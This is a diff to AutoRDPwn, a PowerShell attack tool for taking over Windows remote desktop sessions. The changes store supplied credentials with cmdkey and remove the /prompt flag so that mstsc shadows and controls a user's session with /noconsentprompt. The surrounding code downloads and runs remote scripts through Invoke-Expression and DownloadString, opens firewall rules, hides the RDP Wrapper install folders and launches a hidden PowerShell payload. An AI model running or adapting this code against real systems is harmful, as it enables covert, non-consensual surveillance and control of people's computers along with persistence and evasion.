@@ -631,6 +631,7 @@ function Remove-Exclusions {
 
     Write-Host ; Write-Host "[+] $txt32" -ForegroundColor Blue ; $hostname = invoke-command -session $RDP[0] -scriptblock { $env:computername }
     Write-Host ; Write-Host "[i] $txt33" -NoNewLine ; Write-Host $hostname.tolower() -ForegroundColor Gray ;  if($hash){ cmdkey /add:$computer /user:AutoRDPwn /pass:AutoRDPwn 2>&1> $null }
+    if($user -and $PlainTextPassword -and !$hash){ cmdkey /add:$computer /user:$user /pass:$PlainTextPassword 2>&1> $null }
     $version = invoke-command -session $RDP[0] -scriptblock { (Get-CimInstance -ClassName Win32_OperatingSystem).Caption } ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
 
     if($smbshell){ invoke-command -session $RDP[0] -scriptblock { Start-Job -ScriptBlock { 
@@ -657,8 +658,8 @@ function Remove-Exclusions {
         if($OSVersion -like 'Unix'){ if(!$user){ rdesktop $computer -u $user } else {  rdesktop $computer -u $user -p $password }}
         if(!$nogui){ if($vncserver){ if($local){ Import-Module .\Resources\Scripts\Invoke-VNCViewer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')}
         if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer -disablesponsor -nostatus -notoolbar -autoscaling -nocursor } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer -disablesponsor -nostatus -notoolbar -autoscaling -nocursor }} else {
-        if($control -eq 'true') { if($sticky){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
-        if($control -eq 'false') { if(!$user){ mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}}
+        if($control -eq 'true') { if($sticky){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /f }}
+        if($control -eq 'false') { if(!$user){ mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /f }}}}}
 
         else { Write-Host "[!] $version $txt37" -ForegroundColor Red ; if(!$vncserver){ 
         if($local){ Import-Module .\Resources\Scripts\Invoke-RDPwrap.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-RDPwrap.ps1')}
@@ -668,15 +669,15 @@ function Remove-Exclusions {
         netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
         attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null ; attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null ; if (Get-Process msiexec -ErrorAction SilentlyContinue) { Wait-Process -Name msiexec -Timeout 60 } ; rm .\Setup.msi 2>&1> $null }}
 
-        if(!$sticky) { $shadow = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer).SessionId | Sort-Object | Select-Object -Last 1 } ; Write-Host ; Write-Host "[+] $txt35" -ForegroundColor Blue ; Start-Sleep -milliseconds 600 }
+        if(!$sticky) { $shadow = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer).SessionId | Sort-Object | Select-Object -Last 1 } ; Write-Host ; Write-Host "[+] $txt35" -ForegroundColor Blue ; Start-Sleep -milliseconds 600 } ; if(!$shadow){ $shadow = 1 }
         if($OSVersion -like 'Unix'){ if(!$user){ rdesktop $computer -u $user } else {  rdesktop $computer -u $user -p $password }}
         if(!$nogui){ if($vncserver){ if($local){ Import-Module .\Resources\Scripts\Invoke-VNCViewer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')}
         if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer -disablesponsor -nostatus -notoolbar -autoscaling -nocursor } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer -disablesponsor -nostatus -notoolbar -autoscaling -nocursor }} else {
-        if($control -eq 'true') { if($sticky){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
-        if($control -eq 'false') { if(!$user){ mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}}
+        if($control -eq 'true') { if($sticky){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /f }}
+        if($control -eq 'false') { if(!$user){ mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /f }}}}}
 
 $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
-if ($nogui){ $remotehost = $env:computername.tolower() ; Write-Host "[+] $txt66" ; Write-Host ; Write-Host "mstsc /v $remotehost /admin /shadow:$shadow /control /noconsentprompt /prompt /f" ; Write-Host
+if ($nogui){ $remotehost = $env:computername.tolower() ; Write-Host "[+] $txt66" ; Write-Host ; Write-Host "mstsc /v $remotehost /admin /shadow:$shadow /control /noconsentprompt /f" ; Write-Host
 if ($createuser -like '-createuser') { $hash = "true" ; invoke-command -session $RDP[0] -scriptblock { powershell.exe -windowstyle hidden $using:Pwn5 }}}
 else { Write-Host "[i] $txt38" -ForegroundColor Green ; Start-Sleep -milliseconds 600 }
 
